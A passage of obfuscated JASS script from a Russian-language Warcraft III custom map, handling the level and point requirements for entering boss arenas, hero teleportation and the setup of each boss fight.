call SetUnitPosition(Mc,6402,-23633)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(6402,-23108,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,6402,-23108)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz6)
call GroupEnumUnitsInRect(Np,BD,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
if d8[3]==2 then
set fo[1]=95
set fo[2]=90
call UnitRemoveAbility(K5,$41303736)
call UnitRemoveAbility(K5,$41436D33)
call EnableTrigger(h1)
call EnableTrigger(h0)
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,BD)
call SetUnitPosition(Mc,6402,-23633)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(6402,-23108,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,6402,-23108)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz6)
call GroupEnumUnitsInRect(Np,BD,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
if d8[3]==3 then
if GetUnitLevel(Hu)>=40 then
if GetPlayerState(GetOwningPlayer(Hu),PLAYER_STATE_RESOURCE_LUMBER)>=1900 then
set fo[1]=95
set fo[2]=90
call UnitRemoveAbility(K5,$41303736)
call UnitRemoveAbility(K5,$41436D33)
set TM[0]=90
call EnableTrigger(h1)
call EnableTrigger(h0)
call EnableTrigger(ft)
call EnableTrigger(fy)
call EnableTrigger(fz)
call EnableTrigger(f0)
call EnableTrigger(fx)
call EnableTrigger(f1)
call EnableTrigger(f6)
call EnableTrigger(f5)
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,BD)
call SetUnitPosition(Mc,6402,-23633)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(6402,-23108,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,6402,-23108.)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz6)
call GroupEnumUnitsInRect(Np,BD,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
endif
endif
set Mc=null
endif
endif
set Hu=null
endfunction
function Bz8 takes nothing returns nothing
local trigger hz=CreateTrigger()
call TriggerRegisterEnterRectSimple(hz,l)
call TriggerAddAction(hz,function Bz7)
set hz=null
endfunction
function Bz9 takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B0B takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303232
endfunction
function B0C takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B0D takes nothing returns boolean
return GetBooleanAnd(B0B(),B0C())
endfunction
function B0E takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B0F takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=33) then
return false
endif
return true
endfunction
function B0G takes nothing returns nothing
local integer Mc
if B0F() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,Dj)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set V0=GetRectCenter(Dj)
call SetUnitPositionLocFacingBJ(LH,V0,270.)
call SetUnitOwner(LH,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LH,true)
call RemoveLocation(V0)
set YV[101]=Location(11520.,-24200.)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[101],0)
call RemoveUnit(Wi[17])
call RemoveUnit(Wi[18])
call SetUnitPositionLoc(GetEnteringUnit(),YV[101])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),YV[101],0)
call SetUnitLifePercentBJ(LH,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call EnableTrigger(gN)
call EnableTrigger(gP)
call RemoveLocation(YV[101])
call SaveInteger(NY,GetHandleId(LH),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LH),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(Di,Condition(function B0D))
call ForGroupBJ(SR,function B0E)
call DestroyGroup(SR)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 33 уровень!|r")
endif
endfunction
function B0H takes nothing returns nothing
set eV=CreateTrigger()
call DisableTrigger(eV)
call TriggerRegisterEnterRectSimple(eV,Bl)
call TriggerAddCondition(eV,Condition(function Bz9))
call TriggerAddAction(eV,function B0G)
endfunction
function B0I takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B0J takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303232
endfunction
function B0K takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B0L takes nothing returns boolean
return GetBooleanAnd(B0J(),B0K())
endfunction
function B0M takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B0N takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=33) then
return false
endif
return true
endfunction
function B0O takes nothing returns nothing
local integer Mc
if B0N() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,Dj)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set V0=GetRectCenter(Dj)
call SetUnitPositionLocFacingBJ(LH,V0,270.)
call SetUnitOwner(LH,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LH,true)
call RemoveLocation(V0)
set YV[101]=Location(11520.,-24200.)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[101],0)
call RemoveUnit(Wi[17])
call RemoveUnit(Wi[18])
call SetUnitPositionLoc(GetEnteringUnit(),YV[101])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),YV[101],0)
call SetUnitLifePercentBJ(LH,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call EnableTrigger(gN)
call EnableTrigger(gP)
call EnableTrigger(gO)
call EnableTrigger(gQ)
call RemoveLocation(YV[101])
call RemoveLocation(YV[101])
call SaveInteger(NY,GetHandleId(LH),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LH),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(Di,Condition(function B0L))
call ForGroupBJ(SR,function B0M)
call DestroyGroup(SR)
else
call SetUnitPositionLoc(GetEnteringUnit(),GetRectCenter(Bm))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 33 уровень!|r")
endif
endfunction
function B0P takes nothing returns nothing
set eY=CreateTrigger()
call DisableTrigger(eY)
call TriggerRegisterEnterRectSimple(eY,Bl)
call TriggerAddCondition(eY,Condition(function B0I))
call TriggerAddAction(eY,function B0O)
endfunction
function B0Q takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B0R takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B0S takes nothing returns boolean
return GetUnitLevel(GetFilterUnit())>=46
endfunction
function B0T takes nothing returns boolean
return GetBooleanAnd(B0R(),B0S())
endfunction
function B0U takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303232
endfunction
function B0V takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B0W takes nothing returns boolean
return GetBooleanAnd(B0U(),B0V())
endfunction
function B0X takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B0Y takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=46) then
return false
endif
if not (GetPlayerState(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER)>=3200) then
return false
endif
return true
endfunction
function B0Z takes nothing returns boolean
if not (CountUnitsInGroup(SR)>=4) then
return false
endif
return true
endfunction
function B0a takes nothing returns nothing
local integer Mc
set SR=GetUnitsInRectMatching(GetWorldBounds(),Condition(function B0T))
if B0Z() then
if B0Y() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,Dj)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set V0=GetRectCenter(Dj)
call SetUnitPositionLocFacingBJ(LH,V0,270.)
call SetUnitOwner(LH,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LH,true)
call RemoveLocation(V0)
set YV[101]=Location(11520.,-24200.)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),YV[101],0)
call RemoveUnit(Wi[17])
call RemoveUnit(Wi[18])
call SetUnitPositionLoc(GetEnteringUnit(),YV[101])
call SetUnitLifePercentBJ(LH,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call EnableTrigger(gO)
call EnableTrigger(gQ)
call EnableTrigger(h2)
set UP[0]=90
set UP[1]=95
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_ALWAYSHINT,"|c00ff0000ВНИМАНИЕ: если в момент смерти Босса в игре будет лишь один игрок, Вам засчитают поражение.")
call RemoveLocation(YV[101])
call RemoveLocation(YV[101])
call SaveInteger(NY,GetHandleId(LH),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LH),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(Di,Condition(function B0W))
call ForGroupBJ(SR,function B0X)
call DestroyGroup(SR)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 46 уровень и звание \"Мастер\"(3200 очков)!|r")
endif
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Слишком мало Героев выше 46 уровня!|r")
endif
call DestroyGroup(SR)
endfunction
function B0b takes nothing returns nothing
set eK=CreateTrigger()
call DisableTrigger(eK)
call TriggerRegisterEnterRectSimple(eK,Bl)
call TriggerAddCondition(eK,Condition(function B0Q))
call TriggerAddAction(eK,function B0a)
endfunction
function B0c takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303331
endfunction
function B0d takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B0e takes nothing returns boolean
return GetBooleanAnd(B0c(),B0d())
endfunction
function B0f takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B0g takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=40) then
return false
endif
return true
endfunction
function B0h takes nothing returns nothing
local integer Mc
if B0g() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,B7)
set V0=Location(14080.,-23200.)
call SetUnitPositionLocFacingBJ(LQ,V0,270.)
call SetUnitOwner(LQ,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LQ,true)
call RemoveLocation(V0)
set YV[89]=GetRectCenter(Ch)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[89],0)
call SetUnitPositionLoc(GetEnteringUnit(),YV[89])
set UQ[0]=70
call SetUnitLifePercentBJ(LQ,100)
call RemoveLocation(YV[89])
call RemoveLocation(YV[101])
call SaveInteger(NY,GetHandleId(LQ),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LQ),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(B7,Condition(function B0e))
call ForGroupBJ(SR,function B0f)
call DestroyGroup(SR)
else
set YV[89]=GetRandomLocInRect(B9)
call SetUnitPositionLoc(GetEnteringUnit(),YV[89])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 40 уровень!|r")
call RemoveLocation(YV[89])
endif
endfunction
function B0i takes nothing returns nothing
set eQ=CreateTrigger()
call DisableTrigger(eQ)
call TriggerRegisterEnterRectSimple(eQ,B8)
call TriggerAddAction(eQ,function B0h)
endfunction
function B0j takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303331
endfunction
function B0k takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B0l takes nothing returns boolean
return GetBooleanAnd(B0j(),B0k())
endfunction
function B0m takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B0n takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=40) then
return false
endif
return true
endfunction
function B0o takes nothing returns nothing
local integer Mc
if B0n() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,B7)
set V0=Location(14080.,-23200.)
call SetUnitPositionLocFacingBJ(LQ,V0,270.)
set YV[89]=GetRectCenter(Ch)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[89],0)
call SetUnitPositionLoc(GetEnteringUnit(),YV[89])
call SetUnitOwner(LQ,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LQ,true)
set UQ[0]=70
set UQ[1]=80
call SetUnitLifePercentBJ(LQ,100)
call RemoveLocation(YV[89])
call SaveInteger(NY,GetHandleId(LQ),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LQ),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(B7,Condition(function B0l))
call ForGroupBJ(SR,function B0m)
call DestroyGroup(SR)
else
set YV[89]=GetRandomLocInRect(B9)
call SetUnitPositionLoc(GetEnteringUnit(),YV[89])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 40 уровень!|r")
call RemoveLocation(YV[89])
endif
endfunction
function B0p takes nothing returns nothing
set eS=CreateTrigger()
call DisableTrigger(eS)
call TriggerRegisterEnterRectSimple(eS,B8)
call TriggerAddAction(eS,function B0o)
endfunction
function B0q takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B0r takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B0s takes nothing returns boolean
return GetUnitLevel(GetFilterUnit())>=50
endfunction
function B0t takes nothing returns boolean
return GetBooleanAnd(B0r(),B0s())
endfunction
function B0u takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303331
endfunction
function B0v takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B0w takes nothing returns boolean
return GetBooleanAnd(B0u(),B0v())
endfunction
function B0x takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B0y takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=50) then
return false
endif
if not (GetPlayerState(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER)>=4500) then
return false
endif
return true
endfunction
function B0z takes nothing returns boolean
if not (CountUnitsInGroup(SR)>=4) then
return false
endif
return true
endfunction
function B00 takes nothing returns nothing
local integer Mc
set SR=GetUnitsInRectMatching(GetWorldBounds(),Condition(function B0t))
if B0z() then
if B0y() then
set V0=Location(14080.,-23200.)
call SetUnitPositionLocFacingBJ(LQ,V0,270.)
set YV[89]=GetRectCenter(Ch)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[89],0)
call SetUnitPositionLoc(GetEnteringUnit(),YV[89])
call SetUnitOwner(LQ,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LQ,true)
set UQ[0]=70
set UQ[2]=80
set UQ[3]=90
set UQ[4]=74
call SetUnitLifePercentBJ(LQ,100)
call DisableTrigger(h3)
call RemoveLocation(YV[89])
call SaveInteger(NY,GetHandleId(LQ),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LQ),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(B7,Condition(function B0w))
call ForGroupBJ(SR,function B0x)
call DestroyGroup(SR)
else
set YV[89]=GetRandomLocInRect(B9)
call SetUnitPositionLoc(GetEnteringUnit(),YV[89])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 50 уровень и звание \"СверхМастер\"(4200 очков)!|r")
call RemoveLocation(YV[89])
endif
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Слишком мало Героев 50 уровня!|r")
endif
call DestroyGroup(SR)
endfunction
function B01 takes nothing returns nothing
set eI=CreateTrigger()
call DisableTrigger(eI)
call TriggerRegisterEnterRectSimple(eI,B8)
call TriggerAddCondition(eI,Condition(function B0q))
call TriggerAddAction(eI,function B00)
endfunction
function B02 takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=50) then
return false
endif
return true
endfunction
function B03 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303547
endfunction
function B04 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B05 takes nothing returns boolean
return GetBooleanAnd(B03(),B04())
endfunction
function B06 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B07 takes nothing returns nothing
local integer L9=0
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,D6)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set TS[1]=80
set TS[2]=72
set TS[3]=10
set TS[4]=95
set TS[5]=90
call ShowUnit(Jq,false)
call SetUnitInvulnerable(Jq,true)
set V0=GetRectCenter(D6)
call SetUnitPositionLocFacingBJ(Ly,V0,270.)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
call RemoveLocation(V0)
set YV[99]=GetRectCenter(Gs)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[99],0)
call SetUnitPositionLoc(GetEnteringUnit(),YV[99])
call RemoveLocation(YV[99])
call SetUnitLifePercentBJ(Ly,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call SaveInteger(NY,GetHandleId(Ly),1,0)
loop
call SaveInteger(NY,GetHandleId(Ly),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
set SR=GetUnitsInRectMatching(D6,Condition(function B05))
call ForGroupBJ(SR,function B06)
call DestroyGroup(SR)
endfunction
function B08 takes nothing returns nothing
set eG=CreateTrigger()
call DisableTrigger(eG)
call TriggerRegisterEnterRectSimple(eG,D4)
call TriggerAddCondition(eG,Condition(function B02))
call TriggerAddAction(eG,function B07)
endfunction
function B09 takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=50) then
return false
endif
return true
endfunction
function B1B takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303547
endfunction
function B1C takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function B1D takes nothing returns boolean
return GetBooleanAnd(B1B(),B1C())
endfunction
function B1E takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B1F takes nothing returns nothing
local integer L9=0
call EnableTrigger(eD)
call EnableTrigger(eE)
call EnableTrigger(eF)
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,D6)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set TS[1]=80
set TS[2]=75
set TS[3]=10
set TS[4]=95
set TS[5]=90
call ShowUnit(Jq,false)
call SetUnitInvulnerable(Jq,true)
set V0=GetRectCenter(D6)
call SetUnitPositionLocFacingBJ(Ly,V0,270.)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
call ShowUnit(Ly,true)
call RemoveLocation(V0)
set YV[99]=GetRectCenter(Gs)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[99],0)
call SetUnitPositionLoc(GetEnteringUnit(),YV[99])
call RemoveLocation(YV[99])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),GetRectCenter(Gs),.5)
call SetUnitLifePercentBJ(Ly,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call SaveInteger(NY,GetHandleId(Ly),1,0)
loop
call SaveInteger(NY,GetHandleId(Ly),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
set SR=GetUnitsInRectMatching(D6,Condition(function B1D))
call ForGroupBJ(SR,function B1E)
call DestroyGroup(SR)
endfunction
function B1G takes nothing returns nothing
set eB=CreateTrigger()
call DisableTrigger(eB)
call TriggerRegisterEnterRectSimple(eB,D4)
call TriggerAddCondition(eB,Condition(function B09))
call TriggerAddAction(eB,function B1F)
endfunction
function B1H takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Mc
local integer No
if IsUnitType(Hu,UNIT_TYPE_HERO)==true then
if GetUnitLevel(Hu)>=51 then
set Mc=Kw
call SaveInteger(NY,GetHandleId(Mc),1,0)
set No=0
loop
call SaveInteger(NY,GetHandleId(Mc),2+No,0)
set No=No+1
exitwhen No==7
endloop
if d8[8]==1 then
set UL[0]=98
set UL[2]=80
set UL[3]=75
set UL[4]=90
set UL[5]=99
call SetUnitPosition(Mc,18555,-22530)
call SetUnitFacing(Mc,270.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(18555,-23930,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,18555,-23930)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
elseif d8[8]==2 then
set UL[0]=98
set UL[1]=99
set UL[2]=80
set UL[3]=75
set UL[4]=90
set UL[5]=99
set UL[6]=95
call SetUnitPosition(Mc,18555,-22530)
call SetUnitFacing(Mc,270.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(18555,-23930,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,18555,-23930)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
endif
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,D6)
set Mc=null
endif
endif
set Hu=null
endfunction
function B1I takes nothing returns nothing
local trigger h4=CreateTrigger()
call TriggerRegisterEnterRectSimple(h4,GK)
call TriggerAddAction(h4,function B1H)
set h4=null
endfunction
function B1J takes nothing returns nothing
set QQ=false
set QR=0
set QS=0
set QT=0.
set QU=0.
set QV=0.
set QW=0.
set QX=false
set QY=0
set QZ=0
set Qa=0.
set Qb=0.
set Qc=""
set Qd=false
set h6[0]=h6[0]
set Qe=false
set Qf[0]=0.
set Qg=false
set Qh[0]=0
set Qi=0
set Qj=0.
set Qk=Qk
set Ql[0]=0
set Qm[0]=0
set Qn[0]=0
set QX=false
set Qa=0.
set Qb=0.
set Qo=false
set Qp=false
set h7[0]=null
set Qq[0]=0
set Qr[0]=0.
set Qs[0]=0
set Qt[0]=0
set Qu=0
set Qv[0]=0
set Qw[0]=0.
set Qx[0]=0.
set Qy[0]=0
set Qz[0]=0.
set Q0[0]=false
set Q1[0]=0
set Q2[0]=0
set Q3=0
set Q4[0]=0.
set Q5[0]=false
set Q6[0]=0
set h8[0]=null
set Q7[0]=0
set Q8=0
set Q9[0]=0.
set RB[0]=false
set RC[0]=0
set RD[0]=RD[0]
set RE[0]=0
set RF[0]=0
set RG[0]=0
set RH=0
set RI=0
set RJ=0
set RK[0]=0
set RL[0]=0.
set RM[0]=0
set RN[0]=0
set RO[0]=0
endfunction
function B1K takes nothing returns nothing
set h5=CreateTrigger()
call DisableTrigger(h5)
call TriggerAddAction(h5,function B1J)
endfunction
function B1L takes unit Hu returns integer
local integer L9=0
loop
exitwhen L9>Q8
if h8[L9]==Hu then
return L9
endif
set L9=L9+1
endloop
return -1
endfunction
function B1M takes integer Ma returns integer
local integer L9=0
loop
exitwhen L9>Q3
if Q1[L9]==Ma then
return L9
endif
set L9=L9+1
endloop
return -1
endfunction
function B1O takes unit Hu returns integer
local integer L9=0
loop
exitwhen L9>Qu
if Hu==h7[L9] then
return L9
endif
set L9=L9+1
endloop
return -1
endfunction
function B1P takes unit Hu returns integer
local integer L9=B1O(Hu)
if L9>=0 then
return Qs[L9]
endif
return -1
endfunction
function B1Q takes timer iV returns integer
local integer L9=0
loop
if iV==RD[L9] then
return L9
endif
set L9=L9+1
exitwhen L9>RH
endloop
return -1
endfunction
function B1R takes unit Hu returns nothing
set Qu=Qu+1
set h7[Qu]=Hu
set Qs[Qu]=-1
if Hu!=null then
set Qw[Qu]=GetUnitX(Hu)
set Qx[Qu]=GetUnitY(Hu)
set Qr[Qu]=GetUnitFacing(Hu)
set Qq[Qu]=GetUnitTypeId(Hu)
set Qt[Qu]=Qq[Qu]
set Qv[Qu]=GetPlayerId(GetOwningPlayer(Hu))
endif
endfunction
function B1S takes integer L9 returns nothing
call DestroyTimer(RD[L9])
set RD[L9]=RD[RH]
